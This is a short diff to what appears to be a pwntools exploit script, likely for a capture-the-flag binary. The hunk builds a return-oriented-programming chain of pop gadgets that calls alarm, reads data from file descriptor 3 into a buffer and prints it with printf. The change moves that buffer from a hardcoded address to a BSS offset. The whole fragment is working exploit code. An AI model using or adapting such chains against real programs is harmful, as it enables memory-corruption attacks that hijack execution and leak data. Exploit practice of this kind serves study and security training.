@@ -35,11 +35,11 @@ payload = flat([
     elf.plt["alarm"],
     # syscall read
     pop_rdi_ret,3,
-    pop_rsi_r15_ret,0x601090+0x500,0,
+    pop_rsi_r15_ret,elf.bss(0x200),0,
     pop_rdx_ret,0x30,
     elf.plt['read'],
     # call printf
-    pop_rdi_ret,0x601090+0x500,
+    pop_rdi_ret,elf.bss(0x200),
     elf.plt["printf"],
 ])
 '''
